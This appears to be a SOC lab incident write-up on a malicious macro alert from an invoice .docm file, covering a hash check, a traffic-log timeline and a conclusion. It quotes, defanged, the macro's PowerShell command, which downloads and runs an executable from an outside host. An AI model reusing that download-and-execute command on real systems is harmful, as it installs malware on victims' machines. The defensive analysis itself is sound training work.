# Malicious-Macro

## Incident Overview

=============================================
🚨 SECURITY ALERT — SOC205
=============================================
Event ID      : 231
Event Time    : Feb 28, 2024 — 08:42 AM
Rule          : SOC205 - Malicious Macro has been executed
Level         : Security Analyst

=============================================
🖥️ AFFECTED HOST
=============================================
Hostname      : Jayne
IP Address    : 172.16.17.198

=============================================
📄 FILE DETAILS
=============================================
File Name     : edit1-invoice.docm
File Path     : C:\Users\LetsDefend\Downloads\edit1-invoice.docm
File Hash     : 1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0

=============================================
⚙️ DETECTION INFO
=============================================
Trigger       : Suspicious file detected on system
AV/EDR Action : Detected
=============================================

<hr>

## DETECTION AND ANALYSIS
### Hash inspection on Virus Total

The file that was opened on this host was edit1-invoice.docm. Upon looking at the hash on Virus Total we see right away 31 different security vendors have marked this macro as malicious: 

<img width="1892" height="1035" alt="Bad Hash" src="https://github.com/user-attachments/assets/636bb1ae-932f-4425-a8f1-bb53aeef4b2f" />

<hr>

### INVESTIGATE Traffic Logs around IP 172.16.17.198

<b><h4>8:41</h4></b>
A document named ***edit-invoice.docm.zip*** was downloaded by the host. This document must contain a malicious macro as we will see later in the timeline of events. This happens commonly through attachments downloaded through fishing emails.

<img width="1422" height="810" alt="Invoice file created" src="https://github.com/user-attachments/assets/a536080a-51a5-40b3-ad7c-735e00e9865b" />

<hr>

<b><h4>8:42</h4></b>
Once the document was opened the malicious macro executed a remoted Powershell Command which appears to go to Greyhacker.net to download a file.  The full command is below:

<h2> (New-Object System.Net.WebClient).DownloadFile('hxxp://www[.]greyhathacker[.]net/tools/messbox[.]exe','mess.exe'); Start-Process 'mess.exe' </h2>

<img width="1493" height="889" alt="Remote Command Executed" src="https://github.com/user-attachments/assets/fcc50ab8-c988-4e31-bdf8-69c09a0c4b29" />


<hr>

<b><h4>8:42</h4></b>
As seen by Sysmon EventID 22, the host used Powershell to run a DNS query of the Greyhacker.net which returns 92.204.221.16

<img width="1212" height="530" alt="Powershell 2" src="https://github.com/user-attachments/assets/1f3201ae-79dc-4936-81ee-2c0b4a082b0a" />

<hr>

<b><h4>8:42</h4></b>
We see that the host makes another GET request to HTTP[:]//WWW[.]GREYHATHACKER[.]NET/TOOLS/MESSBOX[.]EXE with an HTTP response code of 404 which means it could not find that file. 

<img width="1456" height="619" alt="Could not find" src="https://github.com/user-attachments/assets/0cdd37e6-e1c9-4979-8d0d-d48958de3c13" />

<hr> 

# CONCLUSION 
Although the last log entry shows that the resource it was trying to download could not be found, it is clear that this workstation is compromised and it is making requests to a website which will likely implant persistence mechanisms and elevate privleges. 





## Conclusion
